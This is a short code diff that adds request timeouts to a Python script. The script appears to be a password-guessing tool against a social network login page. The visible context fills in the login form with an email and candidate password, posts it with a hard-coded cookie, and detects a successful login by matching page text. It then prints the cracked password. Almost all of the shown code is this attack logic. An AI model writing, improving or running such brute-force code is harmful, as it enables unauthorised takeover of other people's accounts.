@@ -30,7 +30,7 @@ def create_form():
     form = dict()
     cookie = {"fr": "0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy"}
 
-    data = requests.get(post_url, headers=headers)
+    data = requests.get(post_url, headers=headers, timeout=60)
     for i in data.cookies:
         cookie[i.name] = i.value
     data = BeautifulSoup(data.text, "html.parser").form
@@ -45,7 +45,7 @@ def function(email, passw, i):
         payload, cookie = create_form()
         payload["email"] = email
     payload["pass"] = passw
-    r = requests.post(post_url, data=payload, cookies=cookie, headers=headers)
+    r = requests.post(post_url, data=payload, cookies=cookie, headers=headers, timeout=60)
     if "Find Friends" in r.text or "Two-factor authentication required" in r.text:
         open("temp", "w").write(str(r.content))
         print("\npassword is : ", passw)
